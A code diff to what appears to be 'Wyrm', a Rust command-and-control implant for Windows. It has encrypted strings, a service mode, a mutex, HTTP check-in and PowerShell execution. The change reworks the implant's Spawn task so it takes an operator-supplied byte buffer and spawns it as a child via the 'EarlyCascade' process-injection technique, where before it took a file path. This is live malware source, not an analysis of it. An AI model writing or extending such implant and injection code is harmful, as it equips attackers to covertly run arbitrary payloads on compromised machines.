@@ -12,7 +12,6 @@ use rand::{
 use serde::Serialize;
 use shared::{
     net::CompletedTasks,
-    pretty_print::print_failed,
     tasks::{Command, FirstRunData, Task, WyrmResult, tasks_contains_kill_agent},
 };
 use str_crypter::{decrypt_string, sc};
@@ -32,6 +31,7 @@ use windows_sys::{
     core::{PCWSTR, PWSTR},
 };
 
+use crate::utils::console::print_failed;
 use crate::{
     comms::{comms_http_check_in, upload_file_as_stream},
     entry::{APPLICATION_RUNNING, IS_IMPLANT_SVC},
@@ -48,9 +48,9 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
-    spawn::{Spawn, SpawnMethod},
+    spawn_inject::{Spawn, SpawnMethod},
     utils::{
-        comptime::translate_build_artifacts, proxy::resolve_web_proxy,
+        comptime::translate_build_artifacts, console::print_info, proxy::resolve_web_proxy,
         strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
     },
 };
@@ -332,12 +332,21 @@ impl Wyrm {
                     self.push_completed_task(&task, result);
                 }
                 Command::Spawn => {
-                    let path = task.metadata.unwrap();
-                    Spawn::spawn_child(
-                        &path,
-                        &self.current_working_directory,
-                        SpawnMethod::EarlyCascade,
-                    );
+                    let Ok(buf) = serde_json::from_str::<Vec<u8>>(task.metadata.as_ref().unwrap())
+                    else {
+                        let msg = sc!("Failed to deserialise buffer for spawn", 97).unwrap();
+                        print_failed(msg);
+                        self.push_completed_task::<String>(&task, None);
+
+                        continue;
+                    };
+
+                    print_info(format!(
+                        "Spawning child from buffer with len: {}",
+                        buf.len()
+                    ));
+
+                    Spawn::spawn_child(buf, SpawnMethod::EarlyCascade);
                 }
             }
         }
@@ -665,7 +674,8 @@ impl WyrmMutex {
         {
             use std::ffi::CStr;
 
-            use shared::pretty_print::print_success;
+            use crate::utils::console::print_success;
+
             let s = match CStr::from_bytes_until_nul(&mtx_name) {
                 Ok(s) => s,
                 Err(_) => unsafe { CStr::from_ptr("Could not parse\0".as_ptr() as _) },
